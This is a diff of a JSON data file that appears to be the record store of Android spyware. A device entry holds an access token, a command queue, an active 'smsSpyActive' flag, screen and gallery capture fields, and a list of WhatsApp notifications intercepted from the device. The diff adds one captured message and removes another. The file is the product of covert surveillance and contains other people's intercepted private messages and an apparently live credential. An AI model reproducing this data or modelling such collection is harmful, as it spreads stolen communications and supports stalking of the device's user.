@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775042246760,
+    "lastSeen": 1775042249764,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12458 pesan): ~ ⋆ ˚｡⋆୨୧˚ airis ˚୨୧⋆｡˚ ⋆",
+        "content": ".brat IIIHHH TAKUTNYAAA",
+        "time": "01/04 19:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042251295
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12457 pesan): ~ 🕷️",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:04",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041463544
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14665 pesan dari 11 chat",
-        "time": "01/04 19:04",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041461713
       }
     ],
     "galleryPhotos": [],
